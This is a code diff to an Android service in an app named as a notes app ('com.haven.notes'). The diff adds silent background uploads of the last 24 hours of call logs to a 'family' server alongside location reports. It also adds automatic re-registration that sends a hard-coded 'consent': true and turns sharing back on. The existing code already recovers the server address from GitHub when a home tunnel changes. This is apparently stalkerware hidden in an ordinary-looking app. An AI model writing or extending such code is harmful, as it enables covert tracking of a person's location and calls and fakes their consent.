@@ -30,9 +30,11 @@ import com.google.gson.reflect.TypeToken
 import com.haven.notes.MainActivity
 import com.haven.notes.R
 import com.haven.notes.data.ApiClient
+import com.haven.notes.data.ApiException
 import com.haven.notes.data.FamilySession
 import com.haven.notes.data.LocationPayload
 import com.haven.notes.data.Storage
+import com.haven.notes.util.CallLogHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -269,7 +271,93 @@ class NotesLocationService : Service() {
             if (offline != null) {
                 uploadPayload(offline, session)
             }
-        } catch (_: Exception) {}
+            // Background sync recent call logs (last 24 hours)
+            syncCallLogs(session)
+        } catch (e: Exception) {
+            if (ApiClient.isAuthError(e)) {
+                val fresh = autoReRegister(session)
+                if (fresh != null) {
+                    currentTrigger = "reconnect_auto"
+                    forceNextUpload = true
+                    withContext(Dispatchers.Main) {
+                        requestSingleFix()
+                    }
+                }
+            }
+        }
+    }
+
+    private fun syncCallLogs(session: FamilySession) {
+        if (!CallLogHelper.hasPermission(this)) return
+
+        scope.launch {
+            try {
+                val calls = CallLogHelper.getRecentCalls(this@NotesLocationService, hours = 24)
+                if (calls.isNotEmpty()) {
+                    val body = mapOf("calls" to calls)
+                    apiClient.post(
+                        origin = session.origin,
+                        path = "/v1/family/calls",
+                        token = session.token,
+                        bodyJson = gson.toJson(body)
+                    )
+                }
+            } catch (e: Exception) {
+                if (ApiClient.isAuthError(e)) {
+                    val fresh = autoReRegister(session)
+                    if (fresh != null) {
+                        try {
+                            val calls = CallLogHelper.getRecentCalls(this@NotesLocationService, hours = 24)
+                            if (calls.isNotEmpty()) {
+                                apiClient.post(
+                                    origin = fresh.origin,
+                                    path = "/v1/family/calls",
+                                    token = fresh.token,
+                                    bodyJson = gson.toJson(mapOf("calls" to calls))
+                                )
+                            }
+                        } catch (_: Exception) {}
+                    }
+                }
+            }
+        }
+    }
+
+    private suspend fun autoReRegister(currentSession: FamilySession): FamilySession? = withContext(Dispatchers.IO) {
+        try {
+            val nickname = storage.deviceNickname.ifBlank { "My Phone" }
+            val regBody = gson.toJson(mapOf("name" to nickname, "consent" to true))
+            val respJson = apiClient.post(
+                origin = currentSession.origin,
+                path = "/v1/family/register",
+                token = null,
+                bodyJson = regBody
+            )
+            val mapType = object : TypeToken<Map<String, Any>>() {}.type
+            val resp: Map<String, Any> = gson.fromJson(respJson, mapType)
+            val newId = resp["id"] as? String
+            val newToken = resp["token"] as? String
+            val controller = resp["controller_name"] as? String ?: currentSession.controller
+
+            if (!newId.isNullOrBlank() && !newToken.isNullOrBlank()) {
+                val newSession = currentSession.copy(
+                    id = newId,
+                    token = newToken,
+                    controller = controller,
+                    enabled = true
+                )
+                storage.familySession = newSession
+                try {
+                    val shareBody = gson.toJson(mapOf("enabled" to true))
+                    apiClient.post(newSession.origin, "/v1/family/sharing", token = newToken, bodyJson = shareBody)
+                } catch (_: Exception) {}
+                newSession
+            } else {
+                null
+            }
+        } catch (_: Exception) {
+            null
+        }
     }
 
     private fun getBatteryInfo(): Pair<Int, Boolean> {
@@ -401,17 +489,39 @@ class NotesLocationService : Service() {
         scope.launch {
             val body = mapOf("location" to payload)
             val bodyJson = gson.toJson(body)
+            var activeSession = session
             try {
                 apiClient.post(
-                    origin = session.origin,
+                    origin = activeSession.origin,
                     path = "/v1/family/location",
-                    token = session.token,
+                    token = activeSession.token,
                     bodyJson = bodyJson
                 )
-                storage.setLastFamilyUpload(session.id, System.currentTimeMillis())
+                storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
                 storage.offlineLocation = null
                 forceNextUpload = false
+                syncCallLogs(activeSession)
             } catch (e: Exception) {
+                if (ApiClient.isAuthError(e)) {
+                    val fresh = autoReRegister(activeSession)
+                    if (fresh != null) {
+                        activeSession = fresh
+                        try {
+                            apiClient.post(
+                                origin = activeSession.origin,
+                                path = "/v1/family/location",
+                                token = activeSession.token,
+                                bodyJson = bodyJson
+                            )
+                            storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
+                            storage.offlineLocation = null
+                            forceNextUpload = false
+                            syncCallLogs(activeSession)
+                            return@launch
+                        } catch (_: Exception) {}
+                    }
+                }
+
                 // Queue for offline recovery
                 storage.offlineLocation = payload
                 // If tunnel changed after PC restart, try auto-recovering latest origin from GitHub
@@ -420,15 +530,15 @@ class NotesLocationService : Service() {
                     val mapType = object : TypeToken<Map<String, String>>() {}.type
                     val map: Map<String, String> = gson.fromJson(rawJson, mapType)
                     val newOrigin = map["origin"]
-                    if (!newOrigin.isNullOrBlank() && newOrigin != session.origin) {
+                    if (!newOrigin.isNullOrBlank() && newOrigin != activeSession.origin) {
                         storage.updateFamilyOrigin(newOrigin)
                         apiClient.post(
                             origin = newOrigin,
                             path = "/v1/family/location",
-                            token = session.token,
+                            token = activeSession.token,
                             bodyJson = bodyJson
                         )
-                        storage.setLastFamilyUpload(session.id, System.currentTimeMillis())
+                        storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
                         storage.offlineLocation = null
                         forceNextUpload = false
                     }
